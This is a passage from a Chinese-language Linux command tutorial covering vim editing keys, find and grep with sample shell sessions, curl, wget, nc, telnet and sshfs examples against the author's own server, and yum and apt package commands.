:这个 N 是英文按键。与 n 刚好相反，为『反向』进行前一个搜寻动作。 例如 /vbird 后，按下 N 则表示『向上』搜寻 vbird 。
使用 /word 配合 n 及 N 是非常有帮助的！可以让你重复的找到一些你搜寻的关键词！

-------------------------------------------------------------------------------

<font color='red'><strong>:n1,n2s/word1/word2/g</strong></font>	  
:n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2 ！举例来说，在 100 到 200 行之间搜寻 vbird 并取代为 VBIRD 则：**:100,200s/vbird/VBIRD/g**
<font color='red'><strong>:1,$s/word1/word2/g 或 :%s/word1/word2/g</strong></font>	  
:从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！(常用)
<font color='red'><strong>:1,$s/word1/word2/gc 或 :%s/word1/word2/gc</strong></font>	
:从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用)
:::


### 1.4.3 删除、复制与贴上

:::tip 删除复制与贴上
<font color='red'><strong>x, X</strong></font>  	  
:在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于 [backspace] 亦即是退格键) (常用)

<font color='red'><strong>nx</strong></font>  	  
:n 为数字，连续向后删除 n 个字符。举例来说，我要连续删除 10 个字符， 『10x』。  

<font color='red'><strong>dd</strong></font>  	  
:删除游标所在的那一整行(常用)  

<font color='red'><strong>ndd</strong></font>  	  
:n 为数字。删除光标所在的向下 n 行，例如 20dd 则是删除 20 行 (常用)  

<font color='red'><strong>d1G</strong></font>  	  
:删除光标所在到第一行的所有数据  

<font color='red'><strong>dG</strong></font>  	   
:删除光标所在到最后一行的所有数据  

<font color='red'><strong>d$</strong></font>  	    
:删除游标所在处，到该行的最后一个字符  

<font color='red'><strong>d0</strong></font>     
:那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符  

--------------------------------------------------------------------------------

<font color='red'><strong>yy</strong></font>   :复制游标所在的那一行(常用)  

<font color='red'><strong>nyy</strong></font>  :n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行(常用)

<font color='red'><strong>y1G</strong></font>  :复制游标所在行到第一行的所有数据  

<font color='red'><strong>yG</strong></font>   :复制游标所在行到最后一行的所有数据  

<font color='red'><strong>y0</strong></font>   :复制光标所在的那个字符到该行行首的所有数据  

<font color='red'><strong>y$</strong></font>   :复制光标所在的那个字符到该行行尾的所有数据  

<font color='red'><strong>p, P</strong></font> :p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！  

 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 (常用)

--------------------------------------------------------------------------------

<font color='red'><strong>J</strong></font>	  :将光标所在行与下一行的数据结合成同一行  

<font color='red'><strong>c</strong></font>	  :重复删除多个数据，例如向下删除 10 行，[ 10cj ]  

<font color='red'><strong>u</strong></font>	  :复原前一个动作。(常用)  

<font color='red'><strong>[Ctrl]+r</strong></font>	  :重做上一个动作。(常用)  
:::

## 1.5 搜索查找命令

### 1.5.1 find命令

```sh
#      查询目录  操作参数                          执行前进行确认操作       命令            find结果集                
find   path     -option   [   -print ]   [ -exec   -ok                    command ]       {} \;

# -exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。
# {} 花括号代表前面find查找出来的文件名。
```

:::tip 参数说明 
find 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。

expression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。

<font color='red'><strong>-mount, -xdev </strong></font>: 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件

<font color='red'><strong>-amin n </strong></font>: 在过去 n 分钟内被读取过

<font color='red'><strong>-anewer file</strong></font> : 比文件 file 更晚被读取过的文件

<font color='red'><strong>-atime n </strong></font>: 在过去n天内被读取过的文件

<font color='red'><strong>-cmin n </strong></font>: 在过去 n 分钟内被修改过

<font color='red'><strong>-cnewer file </strong></font>:比文件 file 更新的文件

<font color='red'><strong>-ctime n </strong></font>: 在过去n天内被修改过的文件

<font color='red'><strong>+n几天之前 -n几天之内</strong></font>

<font color='red'><strong>-empty</strong></font> : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name

<font color='red'><strong>-ipath p, -path p</strong></font> : 路径名称符合 p 的文件，ipath 会忽略大小写

<font color='red'><strong>-name name, -iname name </strong></font>: 文件名称符合 name 的文件。iname 会忽略大小写

<font color='red'><strong>-size n </strong></font>: 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。

<font color='red'><strong>-type c </strong></font>: 文件类型是 c 的文件。

```bash
d: 目录

c: 字型装置文件

b: 区块装置文件

p: 具名贮列

f: 一般文件

l: 符号连结

s: socket
```

<font color='red'><strong>-pid n </strong></font>: process id 是 n 的文件

```bash
#你可以使用 ( ) 将运算式分隔，并使用下列运算。

exp1 -and exp2

! expr

-not expr

exp1 -or exp2

exp1, exp2
```
:::

#### 应用实例

##### 将当前目录及其子目录下所有文件后缀为 .c 的文件列出来:

```bash
# find . -name "*.c"

[root@TXYUN-NO2 ~]# find ~ -name "*.cpp"
/root/3.cpp
/root/2.cpp

[root@TXYUN-NO2 ~]# find . -iname "*.cpp"
./3.cpp
./2.cpp

# -o or或者
[root@TXYUN-NO2 ~]# find . -name "*.cpp" -o -name "*.sh"
./3.cpp
./cutFile.sh
./openresty.sh
./2.cpp

```
##### 将当前目录及其子目录中的所有文件列出：

```bash
# find . -type f

[root@TXYUN-NO2 ~]# find . -type f  -name "2.cpp"
./2.cpp

```
##### 将当前目录及其子目录下所有最近 20 天内更新过的文件列出:

```bash
# find . -ctime -20

# 当天更新的文件
[root@TXYUN-NO2 ~]# find . -ctime -1
.
./.bash_history
./2.cpp
./.2.cpp.swp

```
##### 查找 /var/log 目录中更改时间在 7 日以前的普通文件，并在删除之前询问它们：

```bash
# find /var/log -type f -mtime +7 -ok rm {} \;

[root@TXYUN-NO2 test]# touch 1.cpp 2.cpp 3.cpp 4.cpp 5.cpp
[root@TXYUN-NO2 test]# find . -type f -exec rm  {} \;
[root@TXYUN-NO2 test]# ls -lrt
total 0
[root@TXYUN-NO2 test]# touch 1.cpp 2.cpp 3.cpp 4.cpp 5.cpp
[root@TXYUN-NO2 test]# find . -type f -ok rm -rf {} \;
< rm ... ./5.cpp > ? y
< rm ... ./1.cpp > ? n
< rm ... ./4.cpp > ? y
< rm ... ./3.cpp > ? y
< rm ... ./2.cpp > ? n
[root@TXYUN-NO2 test]# ls
1.cpp  2.cpp

```
##### 查找当前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件：

```bash
# find . -type f -perm 644 -exec ls -l {} \;

[root@TXYUN-NO2 test]# ls -lrt
total 0
-rw-r--r-- 1 root root 0 Oct 18 14:13 2.cpp
-rw-r--r-- 1 root root 0 Oct 18 14:13 1.cpp
# 544 查询不到
[root@TXYUN-NO2 test]# find . -type f -perm 544
[root@TXYUN-NO2 test]# find . -type f -perm 644
./1.cpp
./2.cpp
[root@TXYUN-NO2 test]# find . -type f -perm 644 -exec ls -lrt {} \;
-rw-r--r-- 1 root root 0 Oct 18 14:13 ./1.cpp
-rw-r--r-- 1 root root 0 Oct 18 14:13 ./2.cpp

```
##### 查找系统中所有文件长度为 0 的普通文件，并列出它们的完整路径：

```bash
# find / -type f -size 0 -exec ls -l {} \;

[root@TXYUN-NO2 test]# find . -size 0 -exec ls -lrt {} \;
-rw-r--r-- 1 root root 0 Oct 18 14:13 ./1.cpp
-rw-r--r-- 1 root root 0 Oct 18 14:13 ./2.cpp

```

##### 查找当前路径下的文件名后缀是cpp，文件内容含有‘tq’字母的文件

```bash
[root@TXYUN-NO2 test]# find . -name "*.cpp"|xargs grep tq
./1.cpp:12345tql
```

### 1.5.2 grep命令

Linux系统中grep命令是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。grep全称是Global Regular Expression Print，表示全局正则表达式版本，它的使用权限是所有用户

:::tip 主要参数
grep --help可查看

-c：只输出匹配行的计数。

-i：不区分大小写。

-h：查询多文件时不显示文件名。

-l：查询多文件时只输出包含匹配字符的文件名。

-n：显示匹配行及行号。

-s：不显示不存在或无匹配文本的错误信息。

-v：显示不包含匹配文本的所有行。

--color=auto ：可以将找到的关键词部分加上颜色的显示。

**pattern正则表达式主要参数:**

```sh
\： 忽略正则表达式中特殊字符的原有含义。

^：匹配正则表达式的开始行。

$: 匹配正则表达式的结束行。

\<：从匹配正则表达 式的行开始。

\>：到匹配正则表达式的行结束。

[ ]：单个字符，如[A]即A符合要求 。

[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。

.：所有的单个字符。

*：所有字符，长度可以为0。
```
:::

#### 显示所有以.cpp结尾的文件中包含tq的行
```sh
#  grep 'tq' o *.cpp
[root@TXYUN-NO2 test]# grep 'tq' --color=auto *.cpp
1.cpp:12345tql
2.cpp:tqk tqk
3.cpp:tqk tqk002 asda
3.cpp:tqk tqk002 asda

```
#### 显示/root/test/目录下的文件中包含tqk的行
```sh
# read读取
[root@TXYUN-NO2 test]# grep 'tqk' -d read /root/test/*
grep: /root/test/001: Is a directory
/root/test/2.cpp:tqk tqk
/root/test/3.cpp:tqk tqk002 asda
/root/test/3.cpp:tqk tqk002 asda

# 递归方式 recurse
[root@TXYUN-NO2 test]# grep 'tqk' -d recurse /root/test/*
/root/test/001/1.cpp:tqktqk00111
/root/test/2.cpp:tqk tqk
/root/test/3.cpp:tqk tqk002 asda
/root/test/3.cpp:tqk tqk002 asda

# 跳过 001目录
[root@TXYUN-NO2 test]# grep 'tqk' -d skip '001' /root/test/*
/root/test/2.cpp:tqk tqk
/root/test/3.cpp:tqk tqk002 asda
/root/test/3.cpp:tqk tqk002 asda

```
#### 显示/root/test/目录下的文件中包含tqk的行
```sh
#-r 递归方式循环查找
[root@TXYUN-NO2 test]# grep 'tqk' -r  /root/test
/root/test/3.cpp:tqk tqk002 asda
/root/test/3.cpp:tqk tqk002 asda
/root/test/001/1.cpp:tqktqk00111
/root/test/2.cpp:tqk tqk
```

--------------------------------------

```bash

# -r递归文件目录 -h不显示文件名  -n显示行号
[root@TXYUN-NO2 test]# grep -nrh 'tqk'  /root/test
1:tqk tqk002 asda
2:tqk tqk002 asda
1:tqktqk00111
1:tqk tqk

# -r递归文件目录； -h不显示文件名 ； -n显示行号 ；-i 不区分大小写
[root@TXYUN-NO2 test]# grep -nrhi 'tqk'  /root/test
2:TQK
1:tqk tqk002 asda
2:tqk tqk002 asda
1:tqktqk00111
1:tqk tqk
```
----------------------------------------

```bash

# 已TQK开始的行
[root@TXYUN-NO2 test]# grep '^TQK' *.cpp
1.cpp:TQK

# 已da结尾的行
[root@TXYUN-NO2 test]# grep 'da$' *.cpp
3.cpp:tqk tqk002 asda
3.cpp:tqk tqk002 asda

```

## 1.6 web工具命令

### 1.6.1 curl命令
在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称curl为下载工具

#### curl作为http客户端使用
```sh
## 客户端发送消息
curl -H "Content-Type:application/json" -X POST -d '{"service":"tqk001","partId":"95qqtt"}' 'http://49.232.21.151:12345'

## 服务端收到消息
[root@tianqikai ~]# nc -l 12345
POST / HTTP/1.1
Host: 49.232.21.151:12345
User-Agent: curl/7.61.1
Accept: */*
Content-Type:application/json
Content-Length: 38

{"service":"tqk001","partId":"95qqtt"}

```
#### curl下载文件使用

```sh
curl http://49.232.21.151/group1/M00/00/00/rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg >> 1.jpg
```

### 1.6.2 wget命令

wget是Linux中的一个下载文件的工具，wget是在Linux下开发的开放源代码的软件，作者是Hrvoje Niksic

```sh
# 直接下载
wget http://49.232.21.151/group1/M00/00/00/rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg

# 使用 wget -O 下载并以不同的文件名保存 
wget -O tqk.jpg http://49.232.21.151/group1/M00/00/00/rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg

# 使用wget -c重新启动下载中断的文件:
# 对于我们下载大文件时突然由于网络等原因中断非常有帮助，我们可以继续接着下载而不是重新下载一个文件
wget -c http://49.232.21.151/group1/M00/00/00/rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg

# 使用 wget -b 后台下载
wget -b http://49.232.21.151/group1/M00/00/00/rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg

[root@TXYUN-NO2 ~]# wget http://49.232.21.151/group1/M00/00/00/rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg
--2021-10-18 23:25:47--  http://49.232.21.151/group1/M00/00/00/rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg
Connecting to 49.232.21.151:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22635 (22K) [image/jpeg]
Saving to: ‘rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg’

rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg                          100%[===========================================================================================================================================>]  22.10K  --.-KB/s    in 0.03s   

2021-10-18 23:25:47 (708 KB/s) - ‘rBUAEGB-sOaAFhbtAABYayAtqWU181.jpg’ saved [22635/22635]

```

### 1.6.3 nc命令

Linux nc命令用于设置路由器。

**nc -l port**

使用监听模式，管控传入的资料。

```sh
[root@TXYUN-NO2 ~]# telnet 49.232.21.151 12345
Trying 49.232.21.151...
Connected to 49.232.21.151.
Escape character is '^]'.
hello world
quit
Connection closed by foreign host.

[root@tianqikai ~]# nc -l 12345
hello world

```

### 1.6.4 telnet命令

```bash
#安装telnet
[root@TXYUN-NO2 ~]# yum install telnet  -y

[root@TXYUN-NO2 ~]# telnet 49.232.21.151 8080
Trying 49.232.21.151...
Connected to 49.232.21.151.
Escape character is '^]'.

```
### 1.6.5 ping命令

```sh
[root@TXYUN-NO2 ~]# ping 49.232.21.151
PING 49.232.21.151 (49.232.21.151) 56(84) bytes of data.
64 bytes from 49.232.21.151: icmp_seq=1 ttl=55 time=28.6 ms
64 bytes from 49.232.21.151: icmp_seq=2 ttl=55 time=23.9 ms
```

### 1.6.6 sshfs命令

```sh
sudo sshfs -o allow_other,defer_permissions root@1.117.13.88:/mydata/tqk /mydata/gzg
``` 

## 1.7 安装命令

### 1.7.1 yum命令

**yum（ Yellow dog Updater, Modified）是一个在 Fedora 和 RedHat 以及 SUSE 中的 Shell 前端软件包管理器**

:::tip yum常用命令

1. 列出所有可更新的软件清单命令：<font color='green'><strong>yum check-update</strong></font>

2. 更新所有软件命令：<font color='green'><strong>yum update</strong></font>

3. 仅安装指定的软件命令：<font color='green'><strong>yum install [package_name]</strong></font>

4. 仅更新指定的软件命令：<font color='green'><strong>yum update [package_name]</strong></font>

5. 列出所有可安裝的软件清单命令：<font color='green'><strong>yum list</strong></font>

6. 删除软件包命令：<font color='green'><strong>yum remove [package_name]</strong></font>

7. 查找软件包命令：<font color='green'><strong>yum search [keyword]</strong></font>

8. 清除缓存命令:  
<font color='green'><strong>yum clean packages</strong></font>: 清除缓存目录下的软件包  
<font color='green'><strong>yum clean headers</strong></font>: 清除缓存目录下的 headers  
<font color='green'><strong>yum clean oldheaders</strong></font>: 清除缓存目录下旧的 headers  
<font color='green'><strong>yum clean, yum clean all (= yum clean packages; yum clean oldheaders)</strong></font> :清除缓存目录下的软件包及旧的 headers  
:::

### 1.7.2 apt命令

**apt（Advanced Packaging Tool）是一个在 Debian 和 Ubuntu 中的 Shell 前端软件包管理器。**

:::tip apt 常用命令

1. 列出所有可更新的软件清单命令：<font color='blue'><strong>sudo apt update</strong></font>

2. 升级软件包：<font color='blue'><strong>sudo apt upgrade</strong></font>

3. 列出可更新的软件包及版本信息：<font color='blue'><strong>apt list --upgradeable</strong></font>

4. 升级软件包，升级前先删除需要更新软件包：<font color='blue'><strong>sudo apt full-upgrade</strong></font>

5. 安装指定的软件命令：<font color='blue'><strong>sudo apt install [package_name]</strong></font>

6. 安装多个软件包：<font color='blue'><strong>sudo apt install [package_1] [package_2] [package_3]</strong></font>

7. 更新指定的软件命令：<font color='blue'><strong>sudo apt update [package_name]</strong></font>

8. 显示软件包具体信息,例如：版本号，安装大小，依赖关系等等：<font color='blue'><strong>sudo apt show [package_name]</strong></font>

9. 删除软件包命令：<font color='blue'><strong>sudo apt remove [package_name]</strong></font>

10. 清理不再使用的依赖和库文件: <font color='blue'><strong>sudo apt autoremove</strong></font>

11. 移除软件包及配置文件: <font color='blue'><strong>sudo apt purge [package_name]</strong></font>

12. 查找软件包命令： <font color='blue'><strong>sudo apt search [keyword]</strong></font>

13. 列出所有已安装的包：<font color='blue'><strong>apt list --installed</strong></font>

14. 列出所有已安装的包的版本信息：<font color='blue'><strong>apt list --all-versions</strong></font>
:::

## 1.6 其他命令






















